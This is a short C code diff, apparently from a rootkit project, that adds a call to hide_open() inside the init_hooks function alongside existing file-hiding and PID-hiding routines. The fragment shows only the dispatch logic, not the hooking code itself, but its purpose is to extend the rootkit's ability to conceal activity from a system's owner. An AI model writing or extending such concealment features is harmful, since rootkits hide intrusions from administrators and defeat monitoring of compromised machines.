@@ -69,6 +69,9 @@ init_hooks(void)
     if (rootkit.hiding_files)
         hide_files();
 
+    if (rootkit.hiding_open)
+        hide_open();
+
     if (rootkit.hiding_pids) {
         clear_hidden_pids();
         unhide_pids();
